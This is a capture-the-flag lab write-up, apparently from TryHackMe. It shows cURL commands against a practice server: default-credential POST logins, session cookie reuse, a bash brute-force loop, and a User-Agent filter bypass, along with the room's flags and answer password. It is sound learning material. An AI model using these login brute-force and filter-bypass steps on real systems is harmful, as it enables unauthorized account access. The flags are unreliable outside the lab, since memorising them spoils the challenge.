# Exploitation with cURL - Hoperation Eggsploit

## Challenge Overview
This challenge introduces direct interaction with web applications using HTTP requests from the command line via **cURL**.
Instead of relying on a browser, the task demonstrates how attackers and testers can manually craft GET and POST requests, handle cookies and sessions, 
automate login attempts, brute-force weak credentials, and bypass server-side request filtering mechanisms such as User-Agent validation. 

## Learnings
This challenge clarified how web applications communicate at a low level using HTTP and how common web actions—like logging in, maintaining sessions, and filtering clients—can be reproduced manually using cURL. 
I learned how cookies are issued and reused to maintain sessions, how brute-force attacks fundamentally work through repeated POST requests, and how weak security checks (like User-Agent filtering)
can be trivially bypassed. It also reinforced how higher-level tools such as Burp Suite and Hydra are built on these same basic HTTP principles.

## My Solve 
I began by using cURL to send a basic HTTP GET request to the target server, confirming connectivity and identifying that the application expected a `POST` request for authentication. 
I then submitted valid credentials (admin:admin) to the `/post.php` endpoint, successfully receiving the authentication flag.
To understand session handling, I inspected HTTP response headers and observed the Set-Cookie directive, after which I saved the issued session cookie and replayed it in a subsequent request to `/cookie.php`, resulting in authenticated access and a second flag.
Next, I automated a brute-force attack against the /bruteforce.php endpoint using a bash loop that iterated through a wordlist and detected a successful login based on response content, revealing the correct admin password.
Finally, I made a request with a custom User-Agent string, demonstrating how client-side header filtering can be trivially circumvented and obtaining the final flag.
<br/>
**Terminal Working**
```
root@ip-10-49-154-84:~# curl http://10.49.172.37/
Welcome to the cURL practice server!
Try sending a POST request to /post.php
root@ip-10-49-154-84:~# curl -X POST -d "username=admin&password=admin" http://10.49.172.37/post.php
Login successful!
Flag: THM{curl_post_success}
root@ip-10-49-154-84:~# curl -i -X POST -d "username=admin&password=admin" http://10.49.172.37/cookie.php
HTTP/1.1 200 OK
Date: Wed, 24 Dec 2025 19:15:08 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: PHPSESSID=o4trhp0jq5mimm5oqdrgo8o788; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 30
Content-Type: text/html; charset=UTF-8

Login successful. Cookie set.
root@ip-10-49-154-84:~# nano cookies.txt
root@ip-10-49-154-84:~# curl -c cookies.txt -d "username=admin&password=admin" http://10.49.172.37/cookie.php
Login successful. Cookie set.
root@ip-10-49-154-84:~# curl -b cookies.txt http://10.49.172.37/cookie.php
Welcome back, admin!
Flag: THM{session_cookie_master}
root@ip-10-49-154-84:~# nano passwords.txt
root@ip-10-49-154-84:~# nano loop.sh
root@ip-10-49-154-84:~# chmod +x loop.sh
root@ip-10-49-154-84:~# ./loop.sh
Trying password: admin123
Trying password: password
Trying password: letmein
Trying password: secretpass
[+] Password found: secretpass
root@ip-10-49-154-84:~# curl -A "TBFC" http://10.49.172.37/agent.php
Flag: THM{user_agent_filter_bypassed}
```

## Tools Used 
- **cURL** – For crafting and sending raw HTTP requests
- **Bash scripting** – For automating brute-force login attempts

## Flag / Answers
- POST request to /post.php (admin:admin): **THM{curl_post_success}**
- Session cookie reuse on /cookie.php: **THM{session_cookie_master}**
- Admin password discovered via brute force: **secretpass**
- User-Agent bypass on /agent.php: **THM{user_agent_filter_bypassed}**
